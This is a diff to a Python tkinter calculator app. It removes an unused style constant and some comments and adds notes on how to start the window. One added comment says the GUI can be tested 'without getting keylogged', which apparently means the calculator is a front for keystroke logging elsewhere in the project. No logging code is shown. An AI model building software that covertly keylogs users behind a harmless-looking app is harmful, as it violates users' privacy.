@@ -6,8 +6,6 @@ import sys
 WINDOW_WIDTH = 362
 WINDOW_HEIGHT = 500
 
-NORMAL_BUTTON = "fg = \"black\", width = 10, height = 3, bd = 2, relief = \"ridge\", bg = \"#eee\", cursor = \"hand2\""
-
 query = ""
 class MainApplication(tk.Frame):
     def __init__(self, parent, *args, **kwargs):
@@ -30,8 +28,6 @@ class MainApplication(tk.Frame):
         # Creating the buttons
         btn_frame = tk.Frame(self, width = 312, height = 350, bg = "grey")
         btn_frame.pack()
-
-        # relief = solid for equals button?
 
         # First row
         clr_btn = tk.Button(btn_frame, text = "CLR", fg = "black", width = 10, height = 3, bd = 2, relief = "ridge", bg = "#eee", cursor = "hand2", command = self.clear_btn).grid(row = 0)
@@ -66,7 +62,6 @@ class MainApplication(tk.Frame):
     # into text box
     def callback(self, var, index, mode):
         global query
-        # print(self.text_input.get())
         query = self.text_input.get()
 
     def btn_click(self, item):
@@ -97,8 +92,10 @@ class MainApplication(tk.Frame):
             self.text_input.set(result)
             # reset query
             query = result
-        
+
+# initiates the window - can replace function definition with:
 # if __name__ == "__main__":
+# If you just want to test the GUI out without getting keylogged         
 def calc_init():
     calc = tk.Tk()
     calc.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}")
